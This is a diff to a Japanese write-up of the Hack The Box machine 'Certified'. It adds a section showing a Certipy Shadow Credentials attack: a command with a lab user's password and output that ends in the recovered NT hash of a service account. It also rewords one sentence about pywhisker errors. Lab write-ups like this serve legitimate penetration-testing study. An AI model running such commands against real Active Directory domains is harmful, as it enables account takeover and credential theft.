@@ -305,6 +305,8 @@ judith.maderでkerberoastingが実行します。私の場合、ユーザーと�
 sudo ntpdate -u 10.10.11.41
 ```
 
+
+
 ### Note - 補足説明
 
 ```
@@ -525,7 +527,7 @@ kali@Kali [23時55分58秒] [~/HTB/Certified]
 
 ### pywhiskerが失敗するとき
 
-pywhiskerを実行したとき以下のようにエラーが出る場合がある。
+pywhiskerを実行したとき以下のようにエラーが出る場合があります。
 
 ```
 kali@Kali [20時34分03秒] [~/HTB/Certified] 
@@ -594,6 +596,35 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Recovered NT Hash
 a091c1832bcdd4677c28b5a6a1295584
 ```
+
+### Certipyを使ったShadow Credentials攻撃
+
+Certipyを使うとこの一連の作業を自動でしてくれます。
+
+```bash
+kali@Kali [00時08分11秒] [~/HTB/Certified] 
+-> % certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'management_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'd773a0a3-ab9f-ea26-f633-7f4183c3e160'
+[*] Adding Key Credential with device ID 'd773a0a3-ab9f-ea26-f633-7f4183c3e160' to the Key Credentials for 'management_svc'
+[*] Successfully added Key Credential with device ID 'd773a0a3-ab9f-ea26-f633-7f4183c3e160' to the Key Credentials for 'management_svc'
+[*] Authenticating as 'management_svc' with the certificate
+[*] Using principal: management_svc@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Restoring the old Key Credentials for 'management_svc'
+[*] Successfully restored the old Key Credentials for 'management_svc'
+[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
+```
+
+pywhiskerがうまく動作しないときはCertipyを使うといいと思います。あとこっちのほうが楽です。
 
 ## GenericAllの悪用
 
